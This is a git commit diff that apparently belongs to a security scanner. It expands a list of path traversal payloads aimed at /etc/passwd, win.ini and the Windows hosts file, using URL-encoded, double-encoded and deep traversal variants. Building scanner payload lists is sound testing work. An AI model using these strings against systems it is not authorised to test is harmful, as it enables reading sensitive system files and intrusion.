46bcc23d3b2e294ba8b63681f3d0ca190cd8ee46
The Underdog <65360079+fish-hue@users.noreply.github.com>
2025-05-03 08:07:28 -0500

    Update traversal_payloads.py

--- scan_modules/payloads/traversal_payloads.py
+++ scan_modules/payloads/traversal_payloads.py
@@ -1,3 +1,13 @@
 traversal_payloads = [
-    "../../etc/passwd", "..%2F..%2Fetc%2Fpasswd", "..\\..\\windows\\win.ini", "..%252f..%252fetc%252fpasswd"
+    "../../etc/passwd",                  # Basic traversal on Unix-like systems
+    "..%2F..%2Fetc%2Fpasswd",            # URL-encoded traversal
+    "..\\..\\windows\\win.ini",          # Windows-specific traversal
+    "..%252f..%252fetc%252fpasswd",      # Double URL encoding
+    "../../../../../../../etc/passwd",  # Deep traversal with many '..'
+    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # Multi-level URL encoding
+    "..%5C..%5C..%5C..%5Cwindows%5Cwin.ini",  # Windows-style URL encoded traversal
+    "/etc/passwd",                       # Direct access to passwd file
+    "..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",  # Windows deep traversal
+    "....//....//....//etc/passwd",      # Another format of traversal attempt
+    "%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",    # Another variant of URL-encoded traversal
 ]
